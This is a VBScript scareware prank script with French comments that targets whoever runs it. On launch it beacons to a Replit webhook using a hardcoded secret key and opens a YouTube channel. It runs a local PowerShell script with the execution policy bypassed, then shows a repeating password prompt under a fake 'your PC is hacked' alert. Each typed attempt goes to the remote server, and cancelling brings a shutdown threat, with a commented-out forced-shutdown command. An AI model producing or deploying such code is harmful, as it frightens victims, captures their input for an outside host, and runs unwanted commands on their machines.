Option Explicit

Sub Alerte(message)
    MsgBox message, vbCritical + vbOKOnly, "CRITICAL ALERT"
End Sub

Sub EnvoyerWebhook(message)
    On Error Resume Next
    Dim http, url, json, key

    ' URL de ton serveur Replit (modifie avec ton URL)
    url = "https://168cb3da-a04e-4248-8015-31014461fcf1-00-3gre64qdpawms.picard.replit.dev:8080/send"

    ' Clé secrète partagée avec le serveur Replit
    key = "b13e8c8b534de9c20a8b58df19aeca70"

    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/json"
    http.setRequestHeader "X-Secret-Key", key

    ' JSON avec message
    json = "{""message"":""" & Replace(message, """", "\""") & """}"

    http.Send json

    If Err.Number <> 0 Then
        MsgBox "Erreur d’envoi via Replit : " & Err.Description, vbExclamation, "Erreur Webhook"
        Err.Clear
    End If
    On Error GoTo 0
End Sub

Dim shell
Set shell = CreateObject("WScript.Shell")

' Envoie un message au lancement
EnvoyerWebhook "📂 Quelqu’un a ouvert le fichier .vbs"

' Ouvre la page YouTube
shell.Run "https://www.youtube.com/@MaximeRiopel-g7e", 1, False

' Attend 5 secondes pour que la page charge
WScript.Sleep 5000

' Lance le script PowerShell qui lance TinyTask et envoie la combinaison clavier
shell.Run "powershell.exe -ExecutionPolicy Bypass -File ""C:\Users\Yannick\Desktop\roblox.studio\launch_tinytask.ps1""", 1, False

' Attend 10 secondes pour que TinyTask s'ouvre et reçoive la combinaison
WScript.Sleep 10000

' Mot de passe et verrou simple
Dim pwd, correctPwd
correctPwd = "thecode1234"

Do
    ' Tenter de garder la fenêtre VBScript au premier plan pendant 1 seconde avant InputBox
    Dim startTime
    startTime = Timer
    Do While Timer < startTime + 1
        shell.AppActivate "wscript.exe"
        WScript.Sleep 100
    Loop

    pwd = InputBox("Entrez le code pour arrêter l'alerte :", "Code requis")

    ' Envoie la tentative de mot de passe au webhook via Replit
    If Not IsNull(pwd) Then
        EnvoyerWebhook "Tentative de mot de passe entrée : " & pwd
    Else
        EnvoyerWebhook "L'utilisateur a cliqué sur Cancel ou a fermé la fenêtre de saisie."
    End If

    If IsNull(pwd) Then
        ' L'utilisateur a cliqué sur Cancel ou fermé la fenêtre
        MsgBox "Too bad!!!! I own your pcccc i am going to shutdown it!!", vbCritical, "Warning!"
        ' Optionnel : forcer l'arrêt du PC (décommente la ligne suivante si tu veux ça)
        ' shell.Run "shutdown /s /t 10", 0, False
        WScript.Quit
    ElseIf pwd = correctPwd Then
        EnvoyerWebhook "✅ Code correct entré !"
        MsgBox "Code correct. Script terminé.", vbInformation, "Succès"
        Exit Do
    Else
        Alerte "⚠️ Ton PC est hacké !"
    End If
Loop
